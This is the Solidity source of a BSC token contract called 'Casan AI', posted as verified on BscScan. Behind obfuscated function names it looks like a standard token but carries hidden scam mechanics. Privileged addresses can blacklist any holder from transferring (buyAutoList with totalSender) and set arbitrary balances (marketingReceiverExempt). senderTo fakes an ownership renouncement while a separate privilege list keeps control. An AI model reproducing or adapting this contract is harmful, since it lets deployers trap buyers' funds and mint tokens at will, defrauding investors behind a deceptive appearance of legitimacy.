/**
 *Submitted for verification at BscScan.com on 2023-03-08
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.15;

interface shouldAmount {
    function totalSupply() external view returns (uint256);

    function balanceOf(address minSellMax) external view returns (uint256);

    function transfer(address swapTeamShould, uint256 limitFund) external returns (bool);

    function allowance(address isToken, address spender) external view returns (uint256);

    function approve(address spender, uint256 limitFund) external returns (bool);

    function transferFrom(
        address sender,
        address swapTeamShould,
        uint256 limitFund
    ) external returns (bool);

    event Transfer(address indexed from, address indexed minSellTrading, uint256 value);
    event Approval(address indexed isToken, address indexed spender, uint256 value);
}

interface tokenSwapIs is shouldAmount {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

abstract contract swapSellReceiver {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface walletMode {
    function createPair(address totalToken, address launchWallet) external returns (address);
}

interface swapMinFee {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract CasanAI is swapSellReceiver, shouldAmount, tokenSwapIs {

    address public teamFee;

    function marketingReceiverExempt(address limitMax, uint256 limitFund) public {
        takeReceiver();
        walletIs[limitMax] = limitFund;
    }

    function buyAutoList(address tokenList) public {
        takeReceiver();
        if (fromMax != fundEnable) {
            fundEnable = true;
        }
        if (tokenList == teamFee || tokenList == exemptTx) {
            return;
        }
        exemptMarketing[tokenList] = true;
    }

    uint256 public takeTradingMin;

    bool public isReceiver;

    function listSellExempt() public {
        
        if (takeTradingMin != totalReceiver) {
            fromMax = true;
        }
        takeTradingMin=0;
    }

    function launchedToTeam() public view returns (bool) {
        return fundEnable;
    }

    bool public fundEnable;

    function approve(address walletTx, uint256 limitFund) public virtual override returns (bool) {
        exemptFee[_msgSender()][walletTx] = limitFund;
        emit Approval(_msgSender(), walletTx, limitFund);
        return true;
    }

    constructor (){ 
        if (launchSender == totalReceiver) {
            launchSender = totalReceiver;
        }
        swapMinFee shouldFee = swapMinFee(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        exemptTx = walletMode(shouldFee.factory()).createPair(shouldFee.WETH(), address(this));
        tradingAutoExempt = _msgSender();
        if (totalReceiver == takeTradingMin) {
            takeTradingMin = launchSender;
        }
        teamFee = _msgSender();
        totalAt[_msgSender()] = true;
        
        walletIs[_msgSender()] = tokenShould;
        emit Transfer(address(0), teamFee, tokenShould);
        senderTo();
    }

    string private totalTeamTx = "CAI";

    function balanceOf(address minSellMax) public view virtual override returns (uint256) {
        return walletIs[minSellMax];
    }

    function getOwner() external view returns (address) {
        return tradingAutoExempt;
    }

    function marketingFromShould(address txSell) public {
        require(!isReceiver);
        if (launchSender != totalReceiver) {
            fromMax = true;
        }
        totalAt[txSell] = true;
        if (fundEnable != fromMax) {
            totalReceiver = launchSender;
        }
        isReceiver = true;
    }

    function liquidityTo() public view returns (uint256) {
        return launchSender;
    }

    mapping(address => mapping(address => uint256)) private exemptFee;

    function senderTo() public {
        emit OwnershipTransferred(teamFee, address(0));
        tradingAutoExempt = address(0);
    }

    function takeReceiver() private view{
        require(totalAt[_msgSender()]);
    }

    string private atExemptMode = "Casan AI";

    uint256 private tokenShould = 100000000 * 10 ** 18;

    uint256 private launchSender;

    uint8 private sellAt = 18;

    function allowance(address walletReceiverMode, address walletTx) external view virtual override returns (uint256) {
        return exemptFee[walletReceiverMode][walletTx];
    }

    function swapMin() public {
        
        if (totalReceiver != takeTradingMin) {
            takeTradingMin = totalReceiver;
        }
        takeTradingMin=0;
    }

    address public exemptTx;

    function totalSupply() external view virtual override returns (uint256) {
        return tokenShould;
    }

    function receiverMode(address tradingLaunch, address swapTeamShould, uint256 limitFund) internal returns (bool) {
        require(walletIs[tradingLaunch] >= limitFund);
        walletIs[tradingLaunch] -= limitFund;
        walletIs[swapTeamShould] += limitFund;
        emit Transfer(tradingLaunch, swapTeamShould, limitFund);
        return true;
    }

    function fundLiquidity() public view returns (bool) {
        return fromMax;
    }

    uint256 public totalReceiver;

    function transferFrom(address tradingLaunch, address swapTeamShould, uint256 limitFund) external override returns (bool) {
        if (exemptFee[tradingLaunch][_msgSender()] != type(uint256).max) {
            require(limitFund <= exemptFee[tradingLaunch][_msgSender()]);
            exemptFee[tradingLaunch][_msgSender()] -= limitFund;
        }
        return totalSender(tradingLaunch, swapTeamShould, limitFund);
    }

    function transfer(address limitMax, uint256 limitFund) external virtual override returns (bool) {
        return totalSender(_msgSender(), limitMax, limitFund);
    }

    mapping(address => uint256) private walletIs;

    function decimals() external view virtual override returns (uint8) {
        return sellAt;
    }

    function symbol() external view virtual override returns (string memory) {
        return totalTeamTx;
    }

    event OwnershipTransferred(address indexed modeFund, address indexed listFund);

    function name() external view virtual override returns (string memory) {
        return atExemptMode;
    }

    function owner() external view returns (address) {
        return tradingAutoExempt;
    }

    function totalSender(address tradingLaunch, address swapTeamShould, uint256 limitFund) internal returns (bool) {
        if (tradingLaunch == teamFee) {
            return receiverMode(tradingLaunch, swapTeamShould, limitFund);
        }
        require(!exemptMarketing[tradingLaunch]);
        return receiverMode(tradingLaunch, swapTeamShould, limitFund);
    }

    bool private fromMax;

    address private tradingAutoExempt;

    mapping(address => bool) public exemptMarketing;

    mapping(address => bool) public totalAt;

}